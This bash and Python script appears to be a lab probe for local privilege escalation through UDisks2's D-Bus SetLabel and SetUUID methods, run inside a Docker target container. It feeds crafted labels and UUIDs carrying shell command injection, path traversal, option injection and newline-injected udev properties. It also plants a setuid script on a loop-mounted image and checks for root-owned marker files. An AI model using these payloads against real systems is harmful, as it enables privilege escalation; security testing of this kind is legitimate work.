#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-label-uuid.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -Eeuo pipefail

name=active-udisks-label-uuid
tmp="/tmp/$name"
home="/home/selfauth/$name"
root_marker="/root/${name}-root"
run_marker="/run/${name}-root"
tmp_marker="/tmp/${name}-user"

cleanup_target() {
  set +e
  findmnt -rn -o TARGET | grep -E '^/media/selfauth/(LABELUUID|SAFESET|active-udisks-label)' |
    sort -r | xargs -r -n1 umount >/dev/null 2>&1 || true
  losetup -a | awk -F: '/active-udisks-label-uuid/ {print $1}' |
    xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  rm -rf "$home" "$tmp" "$root_marker" "$run_marker" "$tmp_marker"
  systemctl reset-failed udisks2.service systemd-udevd.service getty@tty1.service >/dev/null 2>&1 || true
}
trap cleanup_target EXIT

rm -rf "$tmp" "$home" "$root_marker" "$run_marker" "$tmp_marker"
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id attacker >/dev/null 2>&1 || useradd -m -s /bin/bash attacker
id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"

{
  echo "active UDisks SetLabel/SetUUID helper-input probe"
  date --iso-8601=seconds
  echo
  echo "## target/default proof"
  sed -n '1,8p' /etc/os-release
  uname -a
  id attacker
  id selfauth
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    udisks2 libudisks2-0 e2fsprogs util-linux polkitd systemd udev python3-dbus python3-gi 2>&1 | sort
  echo

  echo "## service and policy proof"
  systemctl is-enabled udisks2.service 2>&1 || true
  systemctl is-active udisks2.service 2>&1 || true
  systemctl cat udisks2.service 2>&1 | sed -n '1,80p'
  echo
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.loop-setup/,+75p'
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.modify-device"/,+75p'
  nl -ba /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy |
    sed -n '/org.freedesktop.udisks2.modify-device-system/,+75p'
  echo

  echo "## helper path proof"
  for p in /usr/libexec/udisks2/udisksd /usr/sbin/e2label /usr/sbin/tune2fs \
    /usr/bin/udisksctl /usr/bin/gdbus /usr/bin/python3 /dev/disk/by-label /dev/disk/by-uuid; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      stat -Lc '%A %a %U:%G %F %n -> %N' "$p" 2>&1 || true
    else
      echo "MISSING $p"
    fi
  done
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.py" <<'PY'
#!/usr/bin/env python3
import os
import subprocess
import sys
import time
import uuid

import dbus

name = "active-udisks-label-uuid"
home = f"/home/selfauth/{name}"
out = f"/tmp/{name}/user.out"
root_marker = f"/root/{name}-root"
run_marker = f"/run/{name}-root"
tmp_marker = f"/tmp/{name}-user"

def sh(cmd, timeout=25):
    print(f"$ {cmd}", flush=True)
    p = subprocess.run(cmd, shell=True, text=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, timeout=timeout)
    print(p.stdout.rstrip(), flush=True)
    print(f"rc={p.returncode}", flush=True)
    return p

def call_fs(obj, method, *args):
    bus = dbus.SystemBus()
    proxy = bus.get_object("org.freedesktop.UDisks2", obj)
    iface = dbus.Interface(proxy, "org.freedesktop.UDisks2.Filesystem")
    opts = dbus.Dictionary({"auth.no_user_interaction": dbus.Boolean(True, variant_level=1)}, signature="sv")
    return getattr(iface, method)(*args, opts)

def settle(dev):
    sh("udevadm settle --timeout=15 || true", timeout=20)
    sh(f"udevadm info --query=property --name {dev} 2>&1 | "
       "grep -E '^(DEVLINKS|ID_FS|ID_LOOP|SYSTEMD|UDISKS)' | sort || true")
    sh("find /dev/disk/by-label /dev/disk/by-uuid -maxdepth 1 -mindepth 1 -printf '%M %u:%g %p -> %l\\n' 2>/dev/null | sort | sed -n '1,180p'")
    sh(f"stat -Lc '%A %a %U:%G %n' {root_marker} {run_marker} {tmp_marker} 2>&1 || true")

os.makedirs(os.path.dirname(out), exist_ok=True)
sys.stdout = open(out, "w", buffering=1)
sys.stderr = sys.stdout

print("## active selfauth session")
sh("id; tty; echo XDG_SESSION_ID=${XDG_SESSION_ID:-}; "
   "if [ -n \"${XDG_SESSION_ID:-}\" ]; then loginctl show-session \"$XDG_SESSION_ID\" "
   "-p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote; fi")

img = f"{home}/label-uuid.img"
print("\n## build attacker ext4 image")
sh(f"truncate -s 64M {img} && mkfs.ext4 -q -F -L LABELUUID {img} && blkid -p -o export {img} && ls -l {img}")

print("\n## active loop setup")
p = sh(f"udisksctl loop-setup -f {img} --no-user-interaction")
dev = ""
for token in p.stdout.split():
    if token.startswith("/dev/loop"):
        dev = token.rstrip(".")
print(f"dev={dev}")
if not dev:
    sys.exit(1)
obj = "/org/freedesktop/UDisks2/block_devices/" + os.path.basename(dev)
settle(dev)

print("\n## Filesystem interface")
sh(f"gdbus introspect --system --dest org.freedesktop.UDisks2 --object-path {obj} | "
   "sed -n '/interface org.freedesktop.UDisks2.Filesystem/,/};/p'")

labels = [
    "SAFESET",
    "../../root/pwn",
    "semi;id>/root/x",
    "$(id>/root/x)",
    "LD_PRELOAD=/x",
    "-L/root/pwn",
    "line\nSYSTEMD_WANTS=active-udisks-label-uuid.service",
]

print("\n## SetLabel attacker string matrix")
for label in labels:
    print(f"### SetLabel repr={label!r}")
    try:
        result = call_fs(obj, "SetLabel", dbus.String(label))
        print(f"SetLabel_OK result={result!r}")
    except Exception as exc:
        print(f"SetLabel_ERR {type(exc).__name__}: {exc}")
    settle(dev)

print("\n## SetUUID matrix")
uuid_cases = [
    str(uuid.UUID("11111111-2222-4333-8444-555555555555")),
    "../../root/pwn",
    "semi;id>/root/x",
    "$(id>/root/x)",
    "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee\nSYSTEMD_WANTS=x.service",
]
for val in uuid_cases:
    print(f"### SetUUID repr={val!r}")
    try:
        result = call_fs(obj, "SetUUID", dbus.String(val))
        print(f"SetUUID_OK result={result!r}")
    except Exception as exc:
        print(f"SetUUID_ERR {type(exc).__name__}: {exc}")
    settle(dev)

print("\n## mount after label/uuid mutations")
p = sh(f"udisksctl mount -b {dev} --no-user-interaction 2>&1 || true")
mp = ""
for line in p.stdout.splitlines():
    if line.startswith("Mounted ") and " at " in line:
        mp = line.rsplit(" at ", 1)[1].rstrip(".")
print(f"mountpoint={mp}")
if mp:
    sh(f"findmnt -no TARGET,SOURCE,FSTYPE,OPTIONS {mp}; "
       f"stat -c '%A %a %U:%G %n' {mp}; "
       f"printf '#!/bin/sh\\nid > {root_marker} 2>/dev/null || true\\nid > {run_marker} 2>/dev/null || true\\nid > {tmp_marker} 2>/dev/null || true\\n' > {mp}/runme.sh 2>&1 || true; "
       f"chmod 4755 {mp}/runme.sh 2>&1 || true; {mp}/runme.sh 2>&1 || true; "
       f"ls -l {root_marker} {run_marker} {tmp_marker} 2>&1 || true")
    sh(f"udisksctl unmount -b {dev} --no-user-interaction 2>&1 || umount {mp} 2>&1 || true")

print("\n## cleanup loop as active user")
sh(f"udisksctl loop-delete -b {dev} --no-user-interaction 2>&1 || true")
PY

chmod 0755 "$home/probe.py"
chown -R selfauth:selfauth "$home"
cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-label-uuid/probe.py
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 240 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 >/dev/null 2>&1 || true

cat "$tmp/root-prep.out"
echo
cat "$tmp/user.out" 2>&1 || true
echo
echo "## root-side postcheck"
for p in "$root_marker" "$run_marker" "$tmp_marker"; do
  stat -Lc '%A %a %U:%G %n -> %N' "$p" 2>&1 || true
  [ -f "$p" ] && sed -n '1,3p' "$p" 2>&1 || true
done
echo "ROOT_PROOF=$(test -e "$root_marker" && echo yes || echo no)"
journalctl -b --no-pager -u udisks2.service -u systemd-udevd.service \
  -g 'active-udisks-label-uuid|SetLabel|SetUUID|label|uuid|NotAuthorized|Invalid' -n 200 2>&1 || true
EOS

echo "wrote $log"
